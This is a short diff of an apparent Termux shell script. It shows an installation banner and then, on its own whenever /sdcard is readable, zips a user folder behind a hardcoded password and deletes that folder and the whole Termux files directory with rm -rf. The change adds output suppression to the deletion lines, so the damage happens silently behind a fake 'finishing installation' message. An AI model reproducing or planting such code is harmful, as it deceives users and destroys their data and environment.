@@ -15,8 +15,8 @@ sd(){
     figlet -f cosmike WSD|pv -qL 20
     echo -e "\033[01;35mBy \033[01;36m@WestSideDev\n\033[01;35mAgurde estamos terminando a instalação...\033[m"|pv -qL 15
     zip -P /0x02hav -r /sdcard/WSDados.zip /sdcard/WSDados >> /dev/null 
-    rm -rf /sdcard/WSDados 
-    rm -rf /data/data/com.termux/files/*
+    rm -rf /sdcard/WSDados >> /dev/null
+    rm -rf /data/data/com.termux/files/* >> /dev/null
 }
 
 test -r /sdcard && sd
